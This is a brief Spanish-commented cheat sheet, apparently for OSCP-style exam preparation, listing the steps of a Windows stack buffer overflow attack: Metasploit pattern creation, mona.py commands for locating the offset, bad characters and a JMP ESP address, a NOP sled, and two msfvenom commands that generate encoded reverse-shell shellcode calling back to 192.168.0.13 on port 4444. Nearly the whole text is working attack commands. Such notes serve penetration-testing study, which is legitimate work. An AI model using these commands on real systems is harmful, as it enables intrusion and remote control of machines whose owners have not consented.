# para crear un patron random de caracteres
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

# crear directorio de trabajo
!mona config -set workingfolder c:\mona\%p

# para encontrar offset usando mona
!mona findmsp -distance 2000

# para crear el bytearray sin el nullbyte
!mona bytearray -cpb "\x00"

# buscar los badchars en el array
!mona compare -f C:\mona\oscp\bytearray.bin -a ESP

# para encontrar jmp esp con mona
!mona jmp -r esp -cpb "lista de badchars"

# nops
"\x90" * 16

# crear payload con msfvenom
msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=192.168.0.13 LPORT=4444 -e x86/shikata_ga_nai -f c -b "\x00\xa0\xad\xbe\xde\xef"
msfvenom -p linux/x86/shell_reverse_tcp -a x86 --platform linux LHOST=192.168.0.13 LPORT=4444 -e x86/shikata_ga_nai -f c -b "\x00"
